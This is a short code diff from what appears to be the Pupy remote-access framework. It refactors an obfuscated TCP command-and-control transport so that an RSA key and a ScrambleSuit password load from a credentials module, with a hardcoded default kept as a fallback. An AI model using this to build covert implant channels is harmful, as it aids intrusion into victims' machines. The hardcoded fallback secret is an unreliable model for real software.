@@ -5,8 +5,6 @@ from network.transports import Transport
 from network.lib import *
 from network.lib.transports.scramblesuit.scramblesuit import ScrambleSuitClient, ScrambleSuitServer
 
-#scramblesuit password must be 20 char long
-scramblesuit_passwd="th!s_iS_pupy_sct_k3y"
 
 class TransportConf(Transport):
     info = "TCP transport using obfsproxy's obfs3 transport with a extra rsa+aes layer",
@@ -14,12 +12,28 @@ class TransportConf(Transport):
     server = PupyTCPServer
     client = PupyTCPClient
     stream = PupySocketStream
+    credentials = ["RSA_PUB_KEY", "SCRAMBLESUIT_PASSWD"]
 
     def __init__(self, *args, **kwargs):
         Transport.__init__(self, *args, **kwargs)
 
+        try:
+            import pupy_credentials
+            rsa_pub_key=pupy_credentials.RSA_PUB_KEY
+        except:
+            rsa_pub_key=DEFAULT_RSA_PUB_KEY
+
+        #scramblesuit password must be 20 char long
+        scramblesuit_passwd="th!s_iS_pupy_sct_k3y"
+        try:
+            import pupy_credentials
+            scramblesuit_passwd=pupy_credentials.SCRAMBLESUIT_PASSWD
+        except:
+            pass
+
         self.client_transport_kwargs= {"password":scramblesuit_passwd} 
         self.server_transport_kwargs= {"password":scramblesuit_passwd}
+
         if self.launcher_type == LAUNCHER_TYPE_BIND: #reversing the RSA client/server for BIND payloads so the private key doesn't go on the target
             self.client_transport = chain_transports(
                     ScrambleSuitClient,
